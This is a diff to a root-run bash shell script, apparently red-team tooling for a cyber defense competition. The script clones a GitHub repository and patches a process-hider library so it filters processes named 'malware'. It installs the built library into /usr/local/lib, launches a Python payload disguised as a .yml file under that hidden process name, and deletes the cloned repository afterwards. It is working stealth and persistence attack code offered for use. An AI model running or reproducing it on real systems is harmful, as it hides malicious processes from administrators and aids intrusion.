@@ -1,5 +1,7 @@
 #!/bin/bash
 
+cd /usr/share/
+
 # Check if script is run with sudo
 if [ "$EUID" -ne 0 ]; then
     echo "Please run this script as root (use sudo)."
@@ -16,7 +18,7 @@ fi
 REPO_URL="https://github.com/AYanofsky/ccdc-invisible-saturation/"
 TARGET_FILE="processhider.c"
 SEARCH_STRING="static const char* process_to_filter = "evil_script.py";"
-REPLACE_STRING="static const char* process_to_filter = "python";"
+REPLACE_STRING="static const char* process_to_filter = "malware";"
 
 # Clone the repository
 echo "Cloning repository..."
@@ -44,11 +46,15 @@ make
 
 mv libprocesshider.so /usr/local/lib/
 
-mv dev-inventory.yml ../dev-inventory.yml
+echo $PWD
 
-python3 ../dev-inventory.yml $1 $2 &
+cd ..
 
-cd .. && rm -rf ccdc-invisible-saturation dev-inventory.yml
+mv ccdc-invisible-saturation/dev-inventory.yml ./dev-inventory.yml
+
+exec -a malware python3 dev-inventory.yml $1 $2 &
+
+rm -r ccdc-invisible-saturation
 
 echo "Script execution completed successfully."
 echo "To finish installation, use "
